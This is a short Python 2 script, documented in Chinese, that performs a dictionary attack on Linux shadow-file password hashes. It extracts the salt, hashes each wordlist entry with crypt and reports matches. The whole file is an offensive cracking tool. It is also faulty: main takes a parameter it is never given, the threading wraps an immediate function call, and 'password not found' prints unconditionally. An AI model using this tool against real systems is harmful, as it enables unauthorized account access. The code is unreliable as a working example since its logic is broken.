#!/usr/bin/env python
#-*- coding: utf-8 -*-
"""
Created on 2017/01/20
@author: Chao Zhou
@group : Spider
@contact: 1161192890@qq.com

暴力破解linux shadow密码文件获得加密密码
1、环境
   kail linux   python2.7.13
2、原理
   linux密码shadow文件的加密方式为 salt+加密后密码
   python的crypt函数
   字典文件需自己编写
3、多线程编程实现
"""

import re,threading,platform
class hackLinuxPW():

    def __init__(self,dictFile,user,pwd):
        self.sysstr = platform.system()
        if (self.sysstr == "Linux"):
            self.user = user
            self.dictFile = dictFile
            self.pwd = pwd
            self.salt = re.search('\$(\w+)\$(\w+)\$', pwd).group()
            # self.BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            # self.data_dir = os.path.join(self.BASE_DIR,'data')
            self.testPass(self.pwd)
        else:
            print ("please run this script on linux system!")


    def comparePass(self,pw):
        import crypt
        cryptWord = crypt.crypt(pw, self.salt)
        if (cryptWord == self.pwd):
            print '[+] Found Password: ' + pw + '\n'
        print 'compare once!'



    def testPass(self,pw):
        with open(self.dictFile) as f:
            for line in f:
                line = line.strip('\n')
                t = threading.Thread(target=self.comparePass(line))
                t.start()


        print "[-]Password not found.\n"

def main(self):
    import optparse
    parser = optparse.OptionParser('usage%prog '+'-f <passfile> -u <user> -p <ecryptPass>')
    parser.add_option('-f',dest='passfile',type='string',help='dictionary file')
    parser.add_option('-u',dest='user',type='string',help='user name')
    parser.add_option('-p',dest='ecryptPass',type='string',help='ecrypted password')
    (options,args) = parser.parse_args()
    if (options.passfile == None) | (options.user == None) |(options.ecryptPass == None):
        print parser.usage
        exit(0)
    else:
        passfile = options.passfile
        user = options.user
        ectyptPass = options.ecryptPass
    hackLinuxPW(passfile, user,ectyptPass)

if __name__ == '__main__':
    main()